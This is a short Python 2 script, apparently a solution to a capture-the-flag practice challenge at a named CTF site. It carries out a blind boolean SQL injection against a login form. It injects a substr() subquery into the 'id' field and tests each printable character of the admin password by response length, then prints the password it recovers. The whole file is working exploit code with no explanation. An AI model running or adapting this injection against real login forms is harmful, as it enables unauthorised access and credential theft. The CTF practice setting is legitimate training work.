import urllib
import urllib2

passwordlist = []
url = 'http://ctfq.sweetduet.info:10080/~q6/'

for j in range(1, 50):
    print j
    for x in range(33, 127):
        values = {'id':"admin' and substr((SELECT pass FROM user WHERE id='admin')," + str(j) + ",1)='" + chr(x) + "' --", 'pass':""}
        params = urllib.urlencode(values)
        request = urllib2.Request(url, params)
        response = urllib2.urlopen(request)
        the_page = response.read()
        if len(the_page) > 2000:
            passwordlist.append(chr(x))
            password = "".join(passwordlist)
            print password
            break

password = "".join(passwordlist)
print ""
print "The password is " + password
